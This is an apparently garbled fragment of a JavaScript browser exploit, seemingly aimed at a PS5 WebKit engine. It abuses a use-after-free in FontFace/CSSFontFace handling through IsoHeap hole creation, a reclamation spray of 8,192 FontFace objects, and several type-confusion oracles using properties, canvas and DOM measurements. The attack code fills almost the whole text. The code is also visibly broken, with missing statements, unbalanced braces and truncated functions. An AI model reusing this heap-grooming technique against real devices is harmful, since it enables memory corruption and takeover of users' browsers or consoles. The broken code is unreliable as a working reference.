}

// ============================================================
//  Firmware Detection

  const bytes = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++)

  return bytes;
})();

function makeFontBuffer() {
  const copy = new Uint8Array(FONT_BYTES.length);
  copy.set(FONT_BYTES);
  return copy.buffer;
}

// ============================================================
//  Style Helpers
// ============================================================
function forceStyle() {
  void document.body.offsetTop;
  void document.documentElement.offsetHeight;
}

function addPads(n) {
  const sheet = document.getElementById("s").sheet;
  for (let i = 0; i < n; i++)
    sheet.insertRule(
      `@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`,
      sheet.cssRules.length
    );
  forceStyle();
}

function addFlushRules(n) {
  const st = document.createElement("style");
  st.id = "flush";
  document.head.appendChild(st);
  const sheet = st.sheet;
  for (let i = 0; i < n; i++)
    sheet.insertRule(
      `@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`,
      sheet.cssRules.length
    );
  forceStyle();
}

function deleteFlushRules() {
  const el = document.getElementById("flush");
  if (el && el.sheet) {
    while (el.sheet.cssRules.length) el.sheet.deleteRule(0);
    forceStyle();
  }
}

function killFontFaceSetCache() {
  const f = new FontFace("cachekill" + keepAlive.length, "local(Helvetica)", {
    unicodeRange: "U+E124"
  });
  document.fonts.add(f);
  keepAlive.push(f);
}

// ============================================================
//  PHASE 1: IsoHeap Hole Creation
//  Allocate many FontFace objects in the same IsoHeap,
//  then free every other one to create predictable gaps.
//  When our target CSSFontFace is freed, it falls into one
//  of these holes and we can reclaim with a new FontFace.
// ============================================================
function createHoles() {
  log("Creating IsoHeap holes...");
  const HOLE_COUNT = 4096;
  
  for (let i = 0; i < HOLE_COUNT; i++) {
    const f = new FontFace("hole_" + i, makeFontBuffer(), {
      unicodeRange: "U+E1" + (i % 16).toString(16),
      style: i % 2 === 0 ? "normal" : "italic",
      weight: String(100 + (i % 9) * 100),
      display: ["auto", "block", "swap", "fallback", "optional"][i % 5]
    });
    document.fonts.add(f);
    holeFaces.push(f);
  }
  
  forceStyle();
  log("Hole faces allocated: " + HOLE_COUNT);
  
  // Now delete every other one to create gaps
  // Keep the even-indexed ones, remove odd-indexed
  const toRemove = [];
  for (let i = 1; i < holeFaces.length; i += 2) {
    toRemove.push(holeFaces[i]);
  }
  
  for (const f of toRemove) {
    document.fonts.delete(f);
  }
  
  forceStyle();
  log("Holes punched: " + toRemove.length + " faces removed");
  
  // Try to force GC to finalize the frees
  // On PS5 without explicit gc(), we use allocation pressure
  for (let i = 0; i < 4; i++) {
    const tmp = [];
    for (let j = 0; j < 512; j++) tmp.push(new ArrayBuffer(4096));
  }
  
  log("GC pressure applied, holes should be finalized");
}

// ============================================================
//  PHASE 2: Reclamation Spray
//  After UAF, spray FontFace objects to fill the freed slot.
//  These are the SAME IsoHeap type, so they'll actually
//  overlap with the freed CSSFontFace.
// ============================================================
function reclaimSpray() {
  log("Starting IsoHeap reclamation spray...");
  const RECLAIM_COUNT = 8192;
  
  for (let i = 0; i < RECLAIM_COUNT; i++) {
    // Create FontFace with distinctive properties
    // If this overlaps with a dangling pointer, reading
    // the victim's properties will return OUR values
    const f = new FontFace("RECLAIM_" + i, makeFontBuffer(), {
      unicodeRange: "U+0041", // same range as trigger font
      style: "italic",         // different from trigger
      weight: "900",           // different from trigger
      display: "block",        // different from trigger
      featureSettings: '"calt" off, "liga" off'
    });
    
    // Immediately add to document so it enters CSSFontFace cache
    document.fonts.add(f);
    reclaimFaces.push(f);
  }
  
  forceStyle();
  log("Reclamation spray: " + RECLAIM_COUNT + " FontFace objects");
}

// ============================================================
//  PHASE 3: Type Confusion Oracle
//  After reclamation, check if any FontFace in document.fonts
//  has inconsistent properties — this indicates our dangling
//  pointer now points to a different FontFace's internals.
// ============================================================
function checkTypeConfusion() {
  log("Running type confusion oracle...");
  let anomalies = [];
  
  // Strategy 1: Check all FontFace objects for property mismatches
  // A FontFace JS wrapper that points to the wrong C++ CSSFontFace
  // will have properties that don't match what was set in JS
  for (const face of document.fonts) {
    try {
      const family = face.family;
      const style = face.style;
      const weight = face.weight;
      const display = face.display;
      const status = face.status;
      
      // If family starts with "RECLAIM_" but other props don't match
      // what we set in reclaimSpray, that's type confusion
      if (family && family.startsWith("RECLAIM_")) {
        if (style !== "italic" || weight !== "900" || display !== "block") {
          anomalies.push({
            type: "PROPERTY_MISMATCH",
            family: family,
            expectedStyle: "italic", gotStyle: style,
            expectedWeight: "900", gotWeight: weight,
            expectedDisplay: "block", gotDisplay: display,
            status: status
          });
          log("ANOMALY: " + family + " style=" + style + " weight=" + weight + " display=" + display);
        }
      }
      
      // Check for completely unexpected property values
      // (could indicate pointer to freed/reused memory)
      if (status === "loaded" && family && family.startsWith("hole_")) {
        // hole faces that were deleted shouldn't be loaded
        anomalies.push({
          type: "ZOMBIE_LOADED",
          family: family,
          status: status
        });
        log("ZOMBIE: " + family + " is loaded after deletion!");
      }
      
      // Check for NaN or undefined in numeric properties
      const stretch = face.stretch;
      if (stretch === undefined || (typeof stretch === "number" && isNaN(stretch))) {
        anomalies.push({
          type: "CORRUPT_STRETCH",
          family: family,
          stretch: stretch
        });
        log("CORRUPT: " + family + " stretch=" + stretch);
      }
    } catch(e) {
      // Exception during property access = potentially dangling pointer
      anomalies.push({
        type: "ACCESS_EXCEPTION",
        family: face.family || "unknown",
        error: e.message
      });
      log("EXCEPTION accessing face: " + e.message);
    }
  }
  
  // Strategy 2: Check victim trigger face
  // If victimFace still exists but points to reclaimed memory
  if (victimFace) {
    try {
      const vFamily = victimFace.family;
      const vStatus = victimFace.status;

        anomalies.push({
          type: "VICTIM_CONFUSED",
          originalFamily: "trigger",
          currentFamily: vFamily,
          status: vStatus
        });
        log("VICTIM CONFUSED! trigger -> " + vFamily);

      // If status changed unexpectedly
      if (vStatus === "error" && victimFace._wasLoaded) {
        anomalies.push({
          type: "STATUS_FLIPPED",
          family: vFamily,
          from: "loaded",
          to: "error"
        });

    } catch(e) {
      anomalies.push({
        type: "VICTIM_EXCEPTION",
        error: e.message
      });
      log("VICTIM ACCESS ERROR: " + e.message);
    }
  }
  
  // Strategy 3: Canvas oracle
  // Render text with the trigger font and check if metrics change
  // after reclamation — this catches C++ level type confusion
  // that doesn't surface in JS properties
  try {
    const ctx = document.getElementById("c").getContext("2d");
    
    // Measure with original trigger font reference
    ctx.font = "64px trigger";
    const m1 = ctx.measureText("AB");
    const w1 = m1.width;
    
    // Measure with a known reclaim font
    ctx.font = "64px RECLAIM_0";
    const m2 = ctx.measureText("AB");
    const w2 = m2.width;
    
    // If they match, the trigger font is now rendering as RECLAIM_0
    if (w1 === w2 && w1 > 0) {
      anomalies.push({
        type: "CANVAS_CONFUSION",
        triggerWidth: w1,
        reclaimWidth: w2,
        message: "Trigger font renders identically to RECLAIM_0"
      });
      log("CANVAS ORACLE: trigger width=" + w1 + " reclaim=" + w2 + " MATCH!");
    }
    
    log("Canvas oracle: trigger=" + w1.toFixed(2) + " reclaim=" + w2.toFixed(2));
  } catch(e) {
    log("Canvas oracle error: " + e.message);
  }
  
  // Strategy 4: Font loading oracle
  // Try to load the trigger font again — if the C++ object
  // was replaced, the promise behavior might differ
  try {
    const loadPromise = document.fonts.load("1em trigger", "AB");
    // Don't await — just check if it throws synchronously
    log("Reload test initiated");

    anomalies.push({
      type: "RELOAD_EXCEPTION",
      error: e.message
    });
    log("Reload exception: " + e.message);
  }
  
  // Strategy 5: DOM rendering oracle

    div2.style.cssText = "position:absolute;left:-9999px;top:0;font:64px RECLAIM_0;color:#000;";
    document.body.appendChild(div2);
    const reclaimW = div2.offsetWidth;
    document.body.removeChild(div2);
    
    if (triggerW === reclaimW && triggerW > 0) {
      anomalies.push({
        type: "DOM_RENDER_CONFUSION",
        triggerRenderWidth: triggerW,
        reclaimRenderWidth: reclaimW
      });
      log("DOM ORACLE: trigger=" + triggerW + " reclaim=" + reclaimW + " MATCH!");
    }
    
    log("DOM oracle: trigger=" + triggerW + " reclaim=" + reclaimW);
  } catch(e) {
    log("DOM oracle error: " + e.message);
  }
  
  return anomalies;
}

  log("Attempting crash oracle (read-after-free)...");
  
  try {

};
